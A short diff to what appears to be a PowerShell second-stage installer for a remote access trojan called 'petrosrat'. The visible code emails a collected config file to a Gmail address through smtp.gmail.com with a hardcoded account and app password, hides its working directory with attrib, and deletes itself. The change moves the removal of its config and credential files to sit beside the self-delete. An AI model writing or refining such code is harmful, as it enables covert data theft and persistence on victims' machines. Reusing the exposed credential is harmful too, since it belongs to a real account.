@@ -48,10 +48,6 @@ Add-Content -Path $configfile -Value $path
 #smtp process
 Send-MailMessage -From "websitepetros@gmail.com" -To "websitepetros@gmail.com" -subject "$env:UserName" -Subject $configfile -Attachment $configfile -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "websitepetros@gmail.com", (ConvertTo-SecureString -String "tqck alhn siqo dtqz" -AsPlainText -Force))
 
-# delete config file
-Remove-Item $configfile
-Remove-Item email.txt
-Remove-Item pass.txt
 
 
 # go to temp, make working directory
@@ -83,4 +79,7 @@ attrib +h +s +r petrosrat
 
 # self delete
 Set-Location $initial_dir
+Remove-Item $configfile
+Remove-Item email.txt
+Remove-Item pass.txt
 Remove-Item stage2.ps1
